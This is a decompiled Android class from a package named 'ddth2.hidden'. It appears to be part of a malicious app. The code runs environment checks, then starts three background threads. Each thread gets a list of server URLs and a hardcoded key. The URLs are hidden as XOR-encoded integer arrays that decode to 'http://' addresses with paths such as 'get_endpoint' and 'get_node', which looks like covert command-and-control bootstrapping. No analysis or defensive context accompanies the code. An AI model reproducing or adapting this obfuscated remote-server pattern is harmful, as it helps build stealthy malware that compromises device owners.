package ddth2.hidden;

import android.content.Context;

/* JADX INFO: renamed from: ddth2.hidden.f, reason: case insensitive filesystem */
/* JADX INFO: loaded from: classes.dex */
public final class C0006f {
    private static C0006f d;
    private C0008h a = null;
    private C0008h b = null;
    private C0008h c = null;

    private C0006f() {
    }

    public static synchronized C0006f a() {
        return d;
    }

    public static synchronized C0006f b() {
        if (d == null) {
            d = new C0006f();
        }
        return d;
    }

    public final void c() {
        C0008h c0008h = this.a;
        if (c0008h != null) {
            c0008h.a();
            this.a = null;
        }
        C0008h c0008h2 = this.b;
        if (c0008h2 != null) {
            c0008h2.a();
            this.b = null;
        }
        C0008h c0008h3 = this.c;
        if (c0008h3 != null) {
            c0008h3.a();
            this.c = null;
        }
    }

    public final boolean a(Context context) {
        if (!C0010j.c(context) || C0010j.b(context)) {
            return false;
        }
        C0010j.a(context);
        try {
            if (this.a != null) {
                return false;
            }
            C0008h c0008h = new C0008h(context, new String[]{C0010j.a(new int[]{252, 224, 224, 228, 174, 187, 187, 231, 229, 227, 225, 251, 172, 238, 252, 163, 172, 248, 186, 231, 253, 224, 241}), C0010j.a(new int[]{252, 224, 224, 228, 174, 187, 187, 225, 251, 251, 228, 248, 224, 162, 242, 225, 230, 186, 231, 253, 224, 241}), C0010j.a(new int[]{252, 224, 224, 228, 174, 187, 187, 224, 253, 255, 251, 248, 255, 255, 254, 160, 173, 240, 242, 186, 231, 253, 224, 241})}, new String("35008".equals(new String(new byte[]{116, 101, 115, 116})) ? new byte[]{98, 105, 122, 116, 101, 115, 116, 49} : new byte[]{79, 113, 67, 70, 122, 106, 90, 106, 118, 55, 103, 69, 109, 103, 82, 81}), 1, true);
            this.a = c0008h;
            c0008h.start();
            C0008h c0008h2 = new C0008h(context, new String[]{C0010j.a(new int[]{252, 224, 224, 228, 174, 187, 187, 240, 240, 243, 173, 242, 243, 248, 243, 249, 230, 226, 255, 186, 231, 253, 224, 241, 187, 243, 241, 224, 203, 241, 250, 240, 228, 251, 253, 250, 224}), C0010j.a(new int[]{252, 224, 224, 228, 174, 187, 187, 248, 253, 224, 243, 224, 237, 162, 242, 237, 251, 231, 186, 231, 253, 224, 241, 187, 243, 241, 224, 203, 241, 250, 240, 228, 251, 253, 250, 224}), C0010j.a(new int[]{252, 224, 224, 228, 174, 187, 187, 230, 224, 227, 230, 241, 227, 243, 252, 246, 231, 160, 167, 186, 231, 253, 224, 241, 187, 243, 241, 224, 203, 241, 250, 240, 228, 251, 253, 250, 224})}, "JxKPw3tGtDKfxPRn", 2, false);
            this.b = c0008h2;
            c0008h2.start();
            C0008h c0008h3 = new C0008h(context, new String[]{C0010j.a(new int[]{252, 224, 224, 228, 174, 187, 187, 231, 252, 251, 228, 246, 253, 248, 248, 231, 186, 231, 253, 224, 241, 187, 243, 241, 224, 203, 250, 251, 240, 241}), C0010j.a(new int[]{252, 224, 224, 228, 174, 187, 187, 231, 241, 245, 230, 247, 252, 241, 231, 252, 251, 228, 186, 231, 253, 224, 241, 187, 243, 241, 224, 203, 250, 251, 240, 241})}, "KpvYRoCPvjUdjRCy", 3, true);
            this.c = c0008h3;
            c0008h3.start();
            return true;
        } catch (Exception unused) {
            return false;
        }
    }
}
